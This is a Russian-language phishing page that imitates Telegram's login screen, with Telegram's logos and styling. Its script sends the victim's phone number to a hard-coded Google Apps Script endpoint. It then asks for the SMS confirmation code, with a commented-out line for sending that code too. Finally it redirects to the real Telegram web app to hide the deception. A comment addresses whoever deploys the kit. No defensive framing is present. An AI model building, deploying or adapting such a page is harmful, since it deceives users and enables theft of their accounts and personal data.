<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram</title>
    <style>
        :root {
            --tg-theme-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-hint-color: #999999;
            --tg-theme-link-color: #267ad5;
            --tg-theme-button-color: #3390ec;
            --tg-theme-button-text-color: #ffffff;
            --tg-theme-secondary-bg-color: #f4f4f5;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
            position: relative;
        }

        /* Анимация появления */
        .fade-in {
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            width: 120px;
            height: auto;
        }

        h2 {
            text-align: center;
            font-weight: 500;
            font-size: 20px;
            margin-bottom: 10px;
        }

        p.hint {
            text-align: center;
            color: var(--tg-theme-hint-color);
            font-size: 14px;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        input[type="tel"] {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: none;
            border-bottom: 1px solid #dfe1e5;
            background: transparent;
            outline: none;
            box-sizing: border-box;
            transition: border-bottom 0.2s;
        }

        input[type="tel"]:focus {
            border-bottom: 1px solid var(--tg-theme-link-color);
        }

        input[type="tel"]::placeholder {
            color: var(--tg-theme-hint-color);
        }

        .btn {
            width: 100%;
            padding: 15px;
            background-color: var(--tg-theme-button-color);
            color: var(--tg-theme-button-text-color);
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn:hover {
            opacity: 0.9;
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Скрытые экраны */
        .screen {
            display: none;
        }

        .active {
            display: block;
        }

        /* Loader */
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--tg-theme-button-color);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .code-input {
            text-align: center;
            letter-spacing: 5px;
            font-size: 24px !important;
            padding: 20px !important;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Экран 1: Ввод номера -->
    <div id="step1" class="screen active fade-in">
        <div class="logo">
            <img src="https://telegram.org/img/logo.png" alt="Telegram Logo">
        </div>
        <h2>Ваш телефон</h2>
        <p class="hint">Пожалуйста, укажите ваш код страны и номер телефона.</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="tel" id="phone" placeholder="+79991234567" required autocomplete="off">
            </div>
            <button type="submit" class="btn" id="nextBtn">Далее</button>
            <div class="loader" id="loader"></div>
        </form>
    </div>

    <!-- Экран 2: Код из SMS -->
    <div id="step2" class="screen fade-in">
        <div class="logo">
            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" style="width: 80px;">
        </div>
        <h2>Код подтверждения</h2>
        <p class="hint">Мы отправили код в SMS на ваш телефон.</p>
        
        <form id="codeForm">
            <div class="input-group">
                <input type="text" id="code" class="code-input" placeholder="00000" maxlength="5" required autocomplete="off">
            </div>
            <button type="submit" class="btn" id="verifyBtn">Подтвердить</button>
            <div class="loader" id="loader2"></div>
        </form>
    </div>
</div>

<script>
    // ТВОЙ URL СКРИПТА
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec';

    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const loginForm = document.getElementById('loginForm');
    const codeForm = document.getElementById('codeForm');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    
    let phoneNumber = '';

    // Форматирование номера для красоты
    phoneInput.addEventListener('input', function (e) {
        if (!phoneNumber) return; 
        // Простая логика: если пользователь начал вводить, мы сохраняем чистый номер для отправки
    });

    // Шаг 1: Отправка номера
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        phoneNumber = phoneInput.value;
        
        const btn = document.getElementById('nextBtn');
        const loader = document.getElementById('loader');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        // Отправляем данные
        fetch(`${SCRIPT_URL}?phone=${encodeURIComponent(phoneNumber)}`)
            .then(response => response.text())
            .then(data => {
                console.log("Phone sent");
                // Переключаем экран
                step1.classList.remove('active');
                step2.classList.add('active');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Ошибка соединения');
                btn.style.display = 'block';
                loader.style.display = 'none';
            });
    });

    // Шаг 2: Отправка кода
    codeForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const code = codeInput.value;
        
        const btn = document.getElementById('verifyBtn');
        const loader = document.getElementById('loader2');
        
        btn.disabled = true;
        loader.style.display = 'block';

        // Здесь можно отправить и код, если хочешь (опционально)
        // fetch(`${SCRIPT_URL}?phone=${phoneNumber}&code=${code}`)
        
        // Имитация задержки как в настоящем ТГ
        setTimeout(() => {
            // Редирект на настоящий Telegram
            window.location.href = "https://web.telegram.org/k/";
        }, 1000);
    });
</script>

</body>
</html>
